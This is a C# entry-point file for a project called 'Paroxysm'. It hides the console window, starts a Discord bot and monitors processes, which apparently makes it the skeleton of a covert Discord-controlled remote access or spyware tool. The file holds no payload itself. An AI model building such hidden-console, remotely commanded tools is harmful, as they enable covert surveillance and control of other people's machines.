using Paroxysm.API;
using Paroxysm.Hooks.Actions;
using Paroxysm.Tools;

namespace Paroxysm;

internal abstract class Program
{
    public static void Main(string[] args)
    {
        // Hide console
        ConsoleAction.Follow();

        // Initialize discord bot
        DiscordAPI.Init().GetAwaiter().GetResult();

        // Monitor process 
        MonitorProcess.Init();
    }
}